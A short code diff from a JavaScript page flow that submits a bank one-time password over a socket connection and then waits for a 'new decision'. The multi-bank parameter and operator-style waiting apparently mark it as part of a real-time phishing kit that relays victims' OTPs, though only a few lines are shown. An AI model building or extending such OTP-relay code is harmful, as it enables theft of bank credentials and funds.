@@ -109,7 +109,6 @@
                 }
 
                 hideBankAlert('otpError');
-                initSocketConnection(nodeUrl, sessionId, sessionToken, bank, '4');
                 // ✅ emitir (si no está conectado, se encola y se envía cuando conecte)
                 waitingNewDecision = true;
                 window.rtEmitSubmit('user:submit_otp', {
